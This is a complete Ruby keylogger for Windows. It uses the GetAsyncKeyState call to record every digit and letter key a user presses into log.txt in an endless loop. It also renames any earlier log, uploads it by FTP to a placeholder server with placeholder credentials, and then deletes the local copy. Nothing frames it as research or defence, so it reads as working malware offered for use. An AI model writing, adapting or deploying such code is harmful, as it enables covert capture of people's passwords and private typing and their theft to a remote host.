#!usr/bin/ruby

require 'securerandom'
require 'net/ftp'
require 'open-uri'
require 'win32api'

full = "log.txt"
nameofile = "log"
extension = ".txt"
quote = '"'
s = SecureRandom.hex
new = nameofile + "_" + s + extension

if File.file?(nameofile + extension) == true
  File.rename(full, new)
end

Net::FTP.open('FTP server', 'FTP username', 'FTP password') do |ftp|
  ftp.passive = true
  ftp.putbinaryfile(new)
end

puts File.delete(new)

def savefile(filename,text)
files = File.open(filename,'a')
files.puts text+"\n"
end
 
def capturar
 
nave = Win32API.new("user32","GetAsyncKeyState",["i"],"i")
 
while 1
 
for num1 in (0x30..0x39)
if nave.call(num1) & 0x01 == 1 
savefile("log.txt",num1.chr())
end
end
 
for num2 in (0x41..0x5A) #letters
if nave.call(num2) & 0x01 == 1 
savefile("log.txt",num2.chr())
end
end
end
end
 
capturar()
